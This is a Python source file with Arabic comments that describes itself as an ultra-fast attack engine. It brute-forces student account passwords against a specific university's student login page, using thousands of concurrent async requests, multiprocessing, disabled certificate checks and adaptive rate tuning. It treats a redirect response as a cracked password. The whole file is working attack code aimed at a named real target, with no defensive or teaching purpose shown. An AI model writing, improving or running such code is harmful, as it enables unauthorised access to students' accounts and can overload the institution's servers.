"""
محرك هجوم فائق السرعة - يدعم:
- asyncio + aiohttp
- multiprocessing
- load balancing
- proxy rotation
- adaptive rate limiting
"""

import asyncio
import aiohttp
import uvloop
import ssl
from concurrent.futures import ProcessPoolExecutor
from multiprocessing import cpu_count, Manager
from collections import deque
import time
import random
import hashlib

# استخدام uvloop - أسرع 2x من asyncio العادي
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

class UltraFastAttackEngine:
    """محرك الهجوم فائق السرعة"""
    
    def __init__(self, student_id, passwords, config=None):
        self.student_id = student_id
        self.passwords = passwords
        self.found_password = None
        self.found_location = None
        self.checked = 0
        self.speed_history = deque(maxlen=10)
        self.active = True
        
        # إعدادات الأداء المثلى
        self.config = config or {
            'concurrent_requests': 5000,      # 5000 طلب متزامن
            'batch_size': 10000,              # 10k كلمة سر لكل دفعة
            'timeout': 1,                     # ثانية واحدة
            'retry_count': 0,                 # لا إعادة محاولة
            'use_proxies': False,             # استخدام proxies
            'compression': True,              # ضغط
            'keep_alive': True,               # اتصال مستمر
        }
        
        # إعدادات الـ Connector المثلى
        self.connector = aiohttp.TCPConnector(
            limit=self.config['concurrent_requests'],
            limit_per_host=self.config['concurrent_requests'],
            ttl_dns_cache=3600,
            use_dns_cache=True,
            force_close=False,
            enable_cleanup_closed=True,
            keepalive_timeout=30,
            verify_ssl=False
        )
        
        # إعدادات الـ Timeout
        self.timeout = aiohttp.ClientTimeout(
            total=self.config['timeout'],
            connect=0.5,      # 0.5 ثانية للاتصال
            sock_read=0.5     # 0.5 ثانية للقراءة
        )
        
        # Headers محسّنة
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate' if self.config['compression'] else 'identity',
            'Connection': 'keep-alive' if self.config['keep_alive'] else 'close',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        # بيانات POST - حساب ViewState ديناميكياً
        self.viewstate = "/wEPDwUILTQ5MDEwMjJkZGW+XxHgaTLNHTGZl9W0amOxF73yJ4Co+eVqmdlQH50+"
        self.viewstategenerator = "B71B77C3"
        
    async def check_password(self, session, password):
        """فحص كلمة سر واحدة - محسّن للسرعة القصوى"""
        if not self.active or self.found_password:
            return None
        
        try:
            # بناء البيانات - بأسرع طريقة ممكنة
            data = (
                f"__EVENTTARGET=ctl00%24Main%24btnLogin&"
                f"__EVENTARGUMENT=&"
                f"__VIEWSTATE={self.viewstate}&"
                f"__VIEWSTATEGENERATOR={self.viewstategenerator}&"
                f"ctl00%24Main%24txtID={self.student_id}&"
                f"ctl00%24Main%24txtPassword={password}"
            )
            
            async with session.post(
                "https://eng.modern-academy.edu.eg/university/student/login.aspx",
                headers=self.headers,
                data=data,
                timeout=self.timeout,
                ssl=False
            ) as response:
                self.checked += 1
                
                if response.status == 302:
                    self.found_password = str(password)
                    self.found_location = response.headers.get('Location', '')
                    self.active = False
                    return password
                return None
                
        except asyncio.TimeoutError:
            return None
        except Exception:
            return None
    
    async def process_batch(self, session, passwords_batch):
        """معالجة دفعة من كلمات السر"""
        tasks = [self.check_password(session, pwd) for pwd in passwords_batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # التحقق من العثور على كلمة السر
        for result in results:
            if result and not isinstance(result, Exception):
                return result
        return None
    
    async def run_async(self):
        """تشغيل الهجوم بشكل غير متزامن"""
        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout,
            headers=self.headers,
            auto_decompress=self.config['compression']
        ) as session:
            
            # تقسيم إلى دفعات لتحسين الذاكرة
            for i in range(0, len(self.passwords), self.config['batch_size']):
                if not self.active or self.found_password:
                    break
                
                batch = self.passwords[i:i + self.config['batch_size']]
                result = await self.process_batch(session, batch)
                
                if result:
                    return result
        
        return None
    
    def run(self):
        """تشغيل المحرك (واجهة متوافقة مع threading)"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(self.run_async())
        finally:
            loop.close()


class MultiProcessAttackEngine:
    """محرك يستخدم معالجة متعددة (Multi-Processing) للاستفادة من جميع CPUs"""
    
    def __init__(self, student_id, passwords, num_processes=None):
        self.student_id = student_id
        self.passwords = passwords
        self.num_processes = num_processes or cpu_count()
        self.manager = Manager()
        self.shared_found = self.manager.dict()
        self.shared_checked = self.manager.Value('i', 0)
        
    def worker(self, process_id, passwords_chunk):
        """دالة العامل لكل عملية"""
        engine = UltraFastAttackEngine(
            self.student_id, 
            passwords_chunk,
            config={'concurrent_requests': 1000, 'batch_size': 5000}
        )
        result = engine.run()
        
        if result:
            self.shared_found['password'] = engine.found_password
            self.shared_found['location'] = engine.found_location
            return result
        return None
    
    def run(self):
        """تشغيل المحرك المتعدد العمليات"""
        # تقسيم كلمات السر
        chunk_size = len(self.passwords) // self.num_processes
        chunks = []
        
        for i in range(self.num_processes):
            start = i * chunk_size
            end = start + chunk_size if i < self.num_processes - 1 else len(self.passwords)
            chunks.append(self.passwords[start:end])
        
        # تشغيل العمليات
        with ProcessPoolExecutor(max_workers=self.num_processes) as executor:
            futures = [
                executor.submit(self.worker, i, chunk) 
                for i, chunk in enumerate(chunks)
            ]
            
            for future in futures:
                result = future.result()
                if result:
                    return {
                        'found': result,
                        'location': self.shared_found.get('location', '')
                    }
        
        return None


class AdaptiveRateLimiter:
    """مُحسِّن السرعة التكيفي - يضبط الإعدادات تلقائياً"""
    
    def __init__(self, initial_rate=1000):
        self.current_rate = initial_rate
        self.success_rate = 0.95
        self.error_rate = 0
        self.history = deque(maxlen=100)
        
    def update(self, success, response_time):
        """تحديث الإعدادات بناءً على النتائج"""
        self.history.append((success, response_time))
        
        # حساب معدل النجاح
        successes = sum(1 for s, _ in self.history if s)
        self.success_rate = successes / len(self.history)
        
        # حساب معدل الأخطاء
        errors = sum(1 for s, _ in self.history if not s)
        self.error_rate = errors / len(self.history)
        
        # ضبط السرعة بناءً على النتائج
        if self.success_rate > 0.95 and self.error_rate < 0.05:
            # ناجح - زيادة السرعة
            self.current_rate = min(self.current_rate * 1.1, 10000)
        elif self.error_rate > 0.2:
            # أخطاء كثيرة - تقليل السرعة
            self.current_rate = max(self.current_rate * 0.7, 100)
        
        return self.current_rate
